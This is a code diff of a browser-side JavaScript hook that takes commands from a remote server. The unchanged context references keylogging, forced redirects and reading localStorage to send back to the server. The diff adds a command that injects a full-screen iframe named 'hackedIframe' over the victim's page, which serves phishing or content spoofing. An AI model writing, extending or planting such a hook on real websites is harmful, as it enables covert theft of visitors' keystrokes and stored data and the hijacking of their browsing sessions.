@@ -5,7 +5,8 @@
     var devUrl = "http://localhost:8080/";
 
     var script = document.createElement("SCRIPT");
-    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js';
+    script.src = 'http://code.jquery.com/jquery-1.11.1.min.js';
+//    script.src = 'http://localhost:8080/resources/static/js/jquery.js';
     script.type = 'text/javascript';
     document.getElementsByTagName("head")[0].appendChild(script);
 
@@ -68,6 +69,34 @@
             stopKeyLogger();
         } else if (data.type == 'goToUrl') {
             window.location.href = data.metaData;
+        } else if (data.type == 'goToUrlInFrame') {
+            var embeddableUrl = data.metaData;
+
+
+            var html = "<iframe id='hackedIframe' src='" + embeddableUrl
+                    + "' style='"
+                    + "position:fixed; "
+                    + "top:0px; "
+                    + "left:0px; "
+                    + "bottom:0px; "
+                    + "right:0px; "
+                    + "width:100%; "
+                    + "height:100%; "
+                    + "background-color: white;"
+                    + "border:none; "
+                    + "margin:0; "
+                    + "padding:0; "
+                    + "overflow:hidden; "
+                    + "z-index:999999;'"
+                    + "></iframe>";
+
+            var $hackedIFrame = $('#hackedIframe');
+            if ($hackedIFrame) {
+                $hackedIFrame.remove();
+            }
+
+            $(document.getElementsByTagName("body")[0]).append(html);
+
         } else if (data.type == 'getLocalStorage') {
             var localStorageContent = [];
             for (var i = 0; i < localStorage.length; i++) {
@@ -84,7 +113,7 @@
     function sendCommandToServer(type, data) {
         var url = devUrl + type + '/' + currentId;
 
-        if(type == 'receiveLocaleStorage') {
+        if (type == 'receiveLocaleStorage') {
             data = ({data: data});
         }
 
